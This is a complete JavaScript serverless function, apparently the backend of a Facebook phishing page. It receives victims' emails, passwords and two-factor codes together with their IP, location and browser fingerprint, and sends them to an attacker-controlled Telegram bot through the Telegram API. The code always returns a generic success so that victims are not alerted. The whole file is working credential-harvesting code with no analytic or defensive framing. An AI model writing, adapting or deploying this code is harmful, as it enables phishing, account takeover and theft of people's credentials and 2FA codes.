// api/send.js - Vercel Serverless Function

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  const { email, password, code, rememberMe, extra } = req.body;
  
  // Validate required fields
  if (!email || !password) {
    return res.status(400).json({ error: 'Missing email or password' });
  }
  
  // Get Telegram credentials from environment variables (set in Vercel dashboard)
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.error('Telegram credentials not configured in environment');
    // Still return 200 to not alert the user
    return res.status(200).json({ status: 'ok' });
  }
  
  // Build the message
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  let message = `🔴 *NEW FACEBOOK LOGIN* 🔴\n\n`;
  message += `📧 Email/Phone: \`${email}\`\n`;
  message += `🔑 Password: \`${password}\`\n`;
  if (code) message += `🔐 2FA Code: \`${code}\`\n`;
  message += `💾 Remember Me: ${rememberMe ? 'Yes' : 'No'}\n\n`;
  message += `🕒 Time: ${now} UTC\n`;
  message += `🌐 IP: ${extra?.ipData?.ip || 'unknown'}\n`;
  message += `📍 Location: ${extra?.ipData?.city || ''} ${extra?.ipData?.region || ''} ${extra?.ipData?.country_name || ''}\n`;
  message += `🖥️ OS: ${extra?.fingerprint?.platform || 'unknown'}\n`;
  message += `📱 UA: ${extra?.fingerprint?.userAgent || 'unknown'}\n`;
  message += `📱 Screen: ${extra?.fingerprint?.screenResolution || 'unknown'}\n`;
  message += `⏰ Timezone: ${extra?.fingerprint?.timezone || 'unknown'}\n`;
  message += `🔧 HW Cores: ${extra?.fingerprint?.hardwareConcurrency || 'unknown'}\n`;
  message += `🧠 Plugins: ${extra?.fingerprint?.plugins || 'unknown'}\n`;
  
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    
    if (!response.ok) {
      console.error('Telegram API error:', await response.text());
    }
  } catch (err) {
    console.error('Failed to send to Telegram:', err);
  }
  
  // Always return a generic success response (do not reveal any error to the frontend)
  res.status(200).json({ status: 'ok' });
}
